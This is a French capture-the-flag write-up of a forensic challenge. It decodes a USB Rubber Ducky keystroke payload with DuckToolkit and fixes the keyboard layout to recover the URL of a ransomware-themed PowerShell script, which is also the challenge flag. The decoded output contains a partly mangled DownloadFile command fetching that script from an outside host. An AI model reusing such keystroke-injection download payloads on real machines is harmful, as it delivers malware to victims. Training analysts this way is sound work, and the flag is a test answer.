### Write-up du challenge : Le vilain petit canard 1/2 🦆

**Catégorie :** Forensic  
**Points :** 50  

---

## 📜 Enoncé
Un médecin et intégrateur de solution du CHU de Rennes enregistre les données HL7 du moteur d'intégration Mirth dans le dossier "debugging" de son ordinateur à des fins de debug. Malheureusement, son poste semble avoir été infecté par un malware. 😱

Notre administrateur système Onosh LaBrioche a récupéré un script dans le dossier `C:\Temp\` de son poste de travail. 😎

Le flag est l'URL complète de téléchargement du script.

**Ce challenge ne nécessite pas de reverse.** 🎯  

**Auteur :** Onosh  
**Format du flag :** `CTF-DLS{https://url.tld/script.ext}`

---

## 🔍 Solution

### 1. Découverte du fichier .bin 🧐
Le fichier `louche.bin` est suspect. On peut supposer qu'il contient des informations encodées ou des commandes dissimulées. Comme le challenge est lié à **USB Rubber Ducky**, il est probable qu'il contienne des instructions de frappe automatique. 💡

### 2. Recherche d'outils 🛠️
Je cherche des outils pour analyser ce fichier et je tombe sur un dépôt GitHub intéressant : **DuckToolkit**. Ce dernier contient des scripts pour décoder les payloads **USB Rubber Ducky**. 🚀

J'exécute la commande suivante pour déchiffrer le fichier `.bin` :

```bash
┌──(kali㉿kali)-[~/dls/DuckToolkit/USB-Rubber-Ducky/Decode]
└─$ perl ducky-decode.pl -f ../../../louche.bin
```

### 3. Décryptage du contenu 🔐
Après exécution, voici la sortie obtenue :

```
4 h t t p s . > > r q n s o ; < o n o s h < o v h > 4 + ] f i l e ,
SPACE
] d o z n < D o z n l o q d F i l e 5 ] u r l m 3 C . 5204 T e ; p 5204 t q s k < p s ! 3 - ,
```

Cette chaîne semble être une URL obfusquée, probablement déformée par une utilisation d'un clavier **QWERTY** au lieu d'AZERTY.

### 4. Correction du mapping clavier 🌐
Je recolle les caractères et corrige la correspondance QWERTY → AZERTY.

L'URL reconstruite devient :

```plaintext
https://ransom.onosh.ovh/task.ps1
```

### 5. Assemblage du flag 🧑‍🎓
En mettant l'URL au format demandé, on obtient :

```plaintext
CTF-DLS{https://ransom.onosh.ovh/task.ps1}
```

### 6. Victoire ! 🏆
Et voilà, flag trouvé et challenge réussi ! 🎉

---

## ✨ Conclusion
Grâce à l'outil **DuckToolkit** et à une analyse rigoureuse du fichier `.bin`, j'ai pu extraire l'URL cachée et découvrir le script malveillant. Ce challenge était un bon exercice de **forensic**, combinant décryptage, observation des chaînes et correction des erreurs de clavier. 👏

**Mots-clés :** Forensic, Rubber Ducky, QWERTY, Reverse Keyboard Mapping, DuckToolkit

**Auteur du write-up :** Sigma Chad 🏅

